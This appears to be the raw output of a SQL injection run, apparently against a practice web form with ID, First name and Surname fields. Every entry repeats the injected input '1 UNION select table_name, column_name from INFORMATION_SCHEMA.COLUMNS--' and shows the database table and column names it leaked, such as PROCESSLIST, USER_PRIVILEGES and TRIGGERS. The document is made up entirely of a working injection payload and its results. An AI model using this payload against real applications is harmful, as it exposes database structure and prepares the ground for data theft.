+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : NODEGROUP
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PARTITIONS
+Surname : TABLESPACE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_VERSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_STATUS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_TYPE_VERSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_LIBRARY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_LIBRARY_VERSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_AUTHOR
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_DESCRIPTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_LICENSE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : LOAD_OPTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_MATURITY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PLUGINS
+Surname : PLUGIN_AUTH_VERSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : USER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : HOST
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : DB
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : COMMAND
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : STATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : INFO
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : TIME_MS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : STAGE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : MAX_STAGE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROCESSLIST
+Surname : PROGRESS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : QUERY_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : SEQ
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : STATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : DURATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : CPU_USER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : CPU_SYSTEM
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : CONTEXT_VOLUNTARY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : CONTEXT_INVOLUNTARY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : BLOCK_OPS_IN
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : BLOCK_OPS_OUT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : MESSAGES_SENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : MESSAGES_RECEIVED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : PAGE_FAULTS_MAJOR
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : PAGE_FAULTS_MINOR
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : SWAPS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : SOURCE_FUNCTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : SOURCE_FILE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: PROFILING
+Surname : SOURCE_LINE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : CONSTRAINT_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : CONSTRAINT_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : CONSTRAINT_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : UNIQUE_CONSTRAINT_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : UNIQUE_CONSTRAINT_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : UNIQUE_CONSTRAINT_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : MATCH_OPTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : UPDATE_RULE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : DELETE_RULE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: REFERENTIAL_CONSTRAINTS
+Surname : REFERENCED_TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : SPECIFIC_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : ROUTINE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : ROUTINE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : ROUTINE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : ROUTINE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : DATA_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : CHARACTER_MAXIMUM_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : CHARACTER_OCTET_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : NUMERIC_PRECISION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : NUMERIC_SCALE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : DATETIME_PRECISION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : CHARACTER_SET_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : COLLATION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : DTD_IDENTIFIER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : ROUTINE_BODY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : ROUTINE_DEFINITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : EXTERNAL_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : EXTERNAL_LANGUAGE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : PARAMETER_STYLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : IS_DETERMINISTIC
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : SQL_DATA_ACCESS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : SQL_PATH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : SECURITY_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : CREATED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : LAST_ALTERED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : SQL_MODE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : ROUTINE_COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : DEFINER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : CHARACTER_SET_CLIENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : COLLATION_CONNECTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: ROUTINES
+Surname : DATABASE_COLLATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMATA
+Surname : CATALOG_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMATA
+Surname : SCHEMA_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMATA
+Surname : DEFAULT_CHARACTER_SET_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMATA
+Surname : DEFAULT_COLLATION_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMATA
+Surname : SQL_PATH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMA_PRIVILEGES
+Surname : GRANTEE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMA_PRIVILEGES
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMA_PRIVILEGES
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMA_PRIVILEGES
+Surname : PRIVILEGE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SCHEMA_PRIVILEGES
+Surname : IS_GRANTABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SESSION_STATUS
+Surname : VARIABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SESSION_STATUS
+Surname : VARIABLE_VALUE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SESSION_VARIABLES
+Surname : VARIABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: SESSION_VARIABLES
+Surname : VARIABLE_VALUE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : NON_UNIQUE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : INDEX_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : INDEX_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : SEQ_IN_INDEX
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : COLUMN_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : COLLATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : CARDINALITY
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : SUB_PART
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : PACKED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : NULLABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : INDEX_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: STATISTICS
+Surname : INDEX_COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : TABLE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : ENGINE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : VERSION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : ROW_FORMAT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : TABLE_ROWS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : AVG_ROW_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : DATA_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : MAX_DATA_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : INDEX_LENGTH
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : DATA_FREE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : AUTO_INCREMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : CREATE_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : UPDATE_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : CHECK_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : TABLE_COLLATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : CHECKSUM
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : CREATE_OPTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLES
+Surname : TABLE_COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : TABLESPACE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : ENGINE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : TABLESPACE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : LOGFILE_GROUP_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : EXTENT_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : AUTOEXTEND_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : MAXIMUM_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : NODEGROUP_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLESPACES
+Surname : TABLESPACE_COMMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_CONSTRAINTS
+Surname : CONSTRAINT_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_CONSTRAINTS
+Surname : CONSTRAINT_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_CONSTRAINTS
+Surname : CONSTRAINT_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_CONSTRAINTS
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_CONSTRAINTS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_CONSTRAINTS
+Surname : CONSTRAINT_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_PRIVILEGES
+Surname : GRANTEE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_PRIVILEGES
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_PRIVILEGES
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_PRIVILEGES
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_PRIVILEGES
+Surname : PRIVILEGE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_PRIVILEGES
+Surname : IS_GRANTABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_STATISTICS
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_STATISTICS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_STATISTICS
+Surname : ROWS_READ
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_STATISTICS
+Surname : ROWS_CHANGED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TABLE_STATISTICS
+Surname : ROWS_CHANGED_X_INDEXES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : TRIGGER_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : TRIGGER_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : TRIGGER_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : EVENT_MANIPULATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : EVENT_OBJECT_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : EVENT_OBJECT_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : EVENT_OBJECT_TABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_ORDER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_CONDITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_STATEMENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_ORIENTATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_TIMING
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_REFERENCE_OLD_TABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_REFERENCE_NEW_TABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_REFERENCE_OLD_ROW
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : ACTION_REFERENCE_NEW_ROW
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : CREATED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : SQL_MODE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : DEFINER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : CHARACTER_SET_CLIENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : COLLATION_CONNECTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: TRIGGERS
+Surname : DATABASE_COLLATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_PRIVILEGES
+Surname : GRANTEE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_PRIVILEGES
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_PRIVILEGES
+Surname : PRIVILEGE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_PRIVILEGES
+Surname : IS_GRANTABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : USER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : TOTAL_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : CONCURRENT_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : CONNECTED_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : BUSY_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : CPU_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : BYTES_RECEIVED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : BYTES_SENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : BINLOG_BYTES_WRITTEN
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : ROWS_READ
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : ROWS_SENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : ROWS_DELETED
+
